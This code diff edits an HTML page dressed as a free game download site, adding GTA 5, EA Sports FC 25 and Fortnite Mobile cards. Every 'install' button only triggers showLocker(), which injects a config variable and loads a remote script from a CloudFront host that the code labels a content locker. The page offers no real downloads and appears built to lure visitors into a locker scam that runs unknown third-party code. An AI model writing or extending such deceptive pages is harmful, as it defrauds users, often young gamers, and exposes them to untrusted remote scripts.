@@ -69,7 +69,6 @@
     <input type="text" placeholder="APP OR GAME NAME"/>
 
     <div class="app-container">
-        <!-- نفس البطاقات كما أرسلتها -->
         <div class="app-card">
             <img src="https://i.pinimg.com/736x/92/cd/4d/92cd4d87a69ffef4fde889351302650a.jpg" alt="NBA 2K"/>
             <h3>NBA 2K</h3>
@@ -77,7 +76,26 @@
             <a class="install-btn" onclick="showLocker()">install</a>
         </div>
 
-        <!-- بقية البطاقات تبقى كما هي -->
+        <div class="app-card">
+            <img src="https://upload.wikimedia.org/wikipedia/en/a/a5/Grand_Theft_Auto_V.png" alt="GTA 5"/>
+            <h3>GTA 5</h3>
+            <p>Platforms: 🖥</p>
+            <a class="install-btn" onclick="showLocker()">install</a>
+        </div>
+
+        <div class="app-card">
+            <img src="https://i.pinimg.com/736x/ca/57/0c/ca570cb06de1e8e31344b125da129bc7.jpg" alt="FIFA 24"/>
+            <h3>EA SPORTS FC 25</h3>
+            <p>Platforms: 🖥📱</p>
+            <a class="install-btn" onclick="showLocker()">install</a>
+        </div>
+
+        <div class="app-card">
+            <img src="https://i.pinimg.com/736x/5b/c9/48/5bc948b0ec609eedb6faed1288f5ecb3.jpg" alt="Fortnite Mobile"/>
+            <h3>FORTNITE Mobile</h3>
+            <p>Platforms: 📱</p>
+            <a class="install-btn" onclick="showLocker()">install</a>
+        </div>
 
         <div class="app-card">
             <img src="https://i.pinimg.com/736x/98/15/8b/98158b2a606d3c11401046bf3f9a6af6.jpg" alt="Free Fire"/>
@@ -87,27 +105,27 @@
         </div>
     </div>
 
-    <!-- Content Locker container -->
+    <!-- مكان ظهور الـ Content Locker -->
     <div id="locker-container" class="hidden"></div>
 
+    <!-- سكربت Locker -->
     <script type="text/javascript">
         function showLocker() {
             const lockerContainer = document.getElementById('locker-container');
-            lockerContainer.innerHTML = ''; // مسح المحتوى السابق
+            lockerContainer.innerHTML = ''; // تفريغ المحتوى السابق
             lockerContainer.classList.remove('hidden');
 
-            // كود locker الذي أرسلته
-            const script1 = document.createElement('script');
-            script1.type = 'text/javascript';
-            script1.innerHTML = 'var SOkMG_JYw_skPRvc={"it":4486621,"key":"beacc"};';
-            lockerContainer.appendChild(script1);
+            const scriptVar = document.createElement('script');
+            scriptVar.type = 'text/javascript';
+            scriptVar.innerHTML = 'var SOkMG_JYw_skPRvc={"it":4486621,"key":"beacc"};';
+            lockerContainer.appendChild(scriptVar);
 
-            const script2 = document.createElement('script');
-            script2.src = 'https://d2yc6hxtq0phup.cloudfront.net/8e7000e.js';
-            script2.onload = function () {
+            const scriptSrc = document.createElement('script');
+            scriptSrc.src = 'https://d2yc6hxtq0phup.cloudfront.net/8e7000e.js';
+            scriptSrc.onload = function () {
                 if (typeof _xS === 'function') _xS();
             };
-            lockerContainer.appendChild(script2);
+            lockerContainer.appendChild(scriptSrc);
         }
     </script>
 
